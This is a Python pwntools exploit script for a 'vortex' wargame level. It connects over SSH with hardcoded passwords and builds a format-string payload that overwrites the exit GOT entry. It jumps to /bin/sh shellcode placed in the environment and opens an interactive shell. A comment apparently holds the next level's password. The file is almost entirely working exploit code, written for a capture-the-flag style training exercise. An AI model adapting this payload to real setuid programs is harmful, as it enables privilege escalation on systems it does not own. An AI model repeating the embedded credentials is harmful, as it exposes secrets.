from pwn import *
from pwnhelper import *
import time


FORMAT_STRING_PAYLOAD_OFF = 486
BINARY_PATH = None
CWD = None
ALIGNMENT_OFF = None

local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None


def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global ALIGNMENT_OFF
    compose_downloaded_files(level)
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    CWD = "/tmp"
    BINARY_PATH = "/vortex/vortex4"
    ALIGNMENT_OFF = 0
    return s


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global BINARY_PATH
    global ALIGNMENT_OFF
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    vm_binary = "/vortex/"+level+"/"+"vortex"+level
    s.upload(local_binary, vm_binary)
    CWD = "/vortex/4"
    BINARY_PATH = "./vortex4"
    ALIGNMENT_OFF = 2
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"


# s = connect_to_vm("4", "2YmgK1=jw", remote=False)
s = connect("4", "2YmgK1=jw")

# just initial value that will be updated interactively
# this value needs to be in a certain area, otherwise everything will be aligned wrong
# you could change this value and play with ALIGNMENT_OFF to fix this again
format_string_payload_adr = 0xffffa124
format_string_payload_adr_lower = 0xa124
format_string_payload_adr_upper = 0xffff

exit_got_adr = 0x804a014

context.binary = "/home/kali/PycharmProjects/vortex/4/vortex/vortex4"


log.info("############################################################################################################################################################")
log.info("# CREATE PAYLOAD FILES")
log.info("############################################################################################################################################################")


# write 80 to random adr at offset 10 words from printf stackframe
# 0xffffdfb3


def create_format_string_payload(alignment_offset):
    shellcode = pwnlib.encoders.encoder.null(asm(shellcraft.i386.linux.sh()))
    # shellcode = asm(shellcraft.i386.linux.sh())
    format_string_payload = b""
    format_string_payload += pack(exit_got_adr+2, 32)
    format_string_payload += pack(exit_got_adr+2, 32)
    # format_string_payload += b"DDDD"
    format_string_payload += pack(exit_got_adr, 32)
    format_string_payload += pack(exit_got_adr, 32)
    # format_string_payload += b"DDDD"
    # make sure adr's are aligned
    format_string_payload = shellcode + (format_string_payload*1000) + b"A" * alignment_offset
    return format_string_payload


def create_format_string(fsp_off, fspa_lower, fspa_upper):
    format_string = b""
    lower_off = bytes(str(int(fspa_lower)), "utf-8")
    log.info(f"lower_off: {lower_off}")
    format_string += b"%"+lower_off+b"x"
    format_string += b"%"+bytes(str(fsp_off), "utf-8")+b"$n"
    upper_off = fspa_upper - fspa_lower
    upper_off = bytes(str(int(upper_off)), "utf-8")
    log.info(f"lower_off: {upper_off}")
    format_string += b"%"+upper_off+b"x"
    format_string += b"%"+bytes(str(fsp_off+2), "utf-8")+b"$n"
    return format_string


def upload_files():
    s.upload(gdb_script_find_env_file, gdb_script_find_env_target_file)
    s.upload(gdb_script_file, gdb_script_target_file)
    s.upload(format_string_file, format_string_target_file)
    s.upload(format_string_payload_file, format_string_payload_target_file)
    s.upload(vortex4_c_wrapper_file, vortex4_c_wrapper_target_file)
    s.upload(gdb_script_find_env_remote_file, gdb_script_find_env_remote_target_file)


def execute_remote_gdb_script(s, script_file):
    log.info(f"script_file: {script_file}")
    log.info(f"vortex4_c_wrapper_target_file: {vortex4_c_wrapper_target_file}")

    # io = s.process("env -i gdb -x gdb.script.findenv-remote vortex4-c-wrapper", shell=True, cwd="/vortex/4/")
    io = s.process("sh -c 'env -i gdb -x "+script_file+" vortex4-c-wrapper' 1>/dev/null", shell=True, cwd=CWD)
    # io = s.process(["env", "-i", "gdb", "-x", script_file, vortex4_c_wrapper_target_file])
    # log.info(io.recvuntil(b"(gdb)"))
    # io.sendline("q")
    # io.recvall()
    time.sleep(6)
    io.close()
    io = s.process(["cat", gdb_log_file])
    return io.recvall()


format_string_payload = create_format_string_payload(ALIGNMENT_OFF)

format_string = create_format_string(FORMAT_STRING_PAYLOAD_OFF, format_string_payload_adr_lower, format_string_payload_adr_upper)
log.info(f"format_string: {format_string}")
log.info(f"format_string_payload: {format_string_payload}")

# LOCAL FILES
gdb_script_find_env_file = "/home/kali/PycharmProjects/vortex/4/vortex/gdb.script.findenv"
gdb_script_find_env_remote_file_template = "/home/kali/PycharmProjects/vortex/4/vortex/remote/gdb.script.findenv.template"
gdb_script_find_env_remote_file = "/home/kali/PycharmProjects/vortex/4/vortex/remote/gdb.script.findenv"
gdb_script_file = "/home/kali/PycharmProjects/vortex/4/vortex/gdb.script"
gdb_script_remote_file = "/home/kali/PycharmProjects/vortex/4/vortex/remote/gdb.script"
format_string_file = "/home/kali/PycharmProjects/vortex/4/vortex/format-string"
format_string_payload_file = "/home/kali/PycharmProjects/vortex/4/vortex/format-string-payload"
vortex4_c_wrapper_file = "/home/kali/PycharmProjects/vortex/4/vortex/vortex4-c-wrapper"
write(format_string_file, format_string)
write(format_string_payload_file, format_string_payload)

# REMOTE FILES
gdb_script_find_env_target_file = CWD + "/gdb.script.findenv"
gdb_script_target_file = CWD + "/gdb.script"
format_string_target_file = CWD + "/format-string"
format_string_payload_target_file = CWD + "/format-string-payload"
vortex4_c_wrapper_target_file = CWD + "/vortex4-c-wrapper"
gdb_script_find_env_remote_target_file = CWD + "/gdb.script.findenv-remote"
gdb_log_file = "/tmp/gdb-log"


log.info("############################################################################################################################################################")
log.info("# PREPARE ENV ON TARGET MACHINE")
log.info("############################################################################################################################################################")

# replace binary path in remote find env script

gdb_script_content = read(gdb_script_find_env_remote_file_template).decode("utf-8")
gdb_script_content = gdb_script_content.replace("BINARYPATH", BINARY_PATH)
write(gdb_script_find_env_remote_file, gdb_script_content)

upload_files()
io = s.process(["chmod", "a+x", vortex4_c_wrapper_target_file])



log.info("############################################################################################################################################################")
log.info("# FIND REMOTE ENV PAYLOAD POINTER AND UPDATE FORMAT STRING")
log.info("############################################################################################################################################################")

gdb_output = execute_remote_gdb_script(s, gdb_script_find_env_remote_target_file).decode("utf-8")
log.info(f"gdb_output: {gdb_output}")


shellcode_adr = lower = input("Enter shellcode adr")
shellcode_adr = shellcode_adr[2:]
lower = "0x" + shellcode_adr[4:]
upper = "0x" + shellcode_adr[:4]

log.info(f"lower: {lower}")
log.info(f"upper: {upper}")

# update format string
format_string = create_format_string(FORMAT_STRING_PAYLOAD_OFF, int(lower, 16), int(upper, 16))
log.info(f"format_string: {format_string}")
write(format_string_file, format_string)
s.upload(format_string_file, format_string_target_file)


# gcc -no-pie -m32 vortex4.c -o vortex4-c-wrapper
# env -i gdb -x gdb.script.findenv vortex4-c-wrapper

input("Press Enter to execute exploit")

log.info("############################################################################################################################################################")
log.info("# EXECUTE EXPLOIT")
log.info("############################################################################################################################################################")



io = s.process("env -i ./vortex4-c-wrapper `cat ./format-string` `cat ./format-string-payload` "+BINARY_PATH, shell=True, cwd=CWD)
# io = s.process(["env", "-i", vortex4_c_wrapper_target_file, format_string, format_string_payload, "/vortex/4/vortex4"])
io.recv()
io.interactive()

# :4VtbC4lr

'''
0xffff9f68:     0x00000000      0xf7de4e46      0x00000000      0xffffa014
0xffff9f78:     0xffffa018      0xffff9fa4      0xffff9fb4      0xf7ffdb40
0xffff9f88:     0xf7fca410      0xf7fab000


0xffffa018 is ppointer to AAAA -> 0xffff9fa4 is adr for next stage
'''
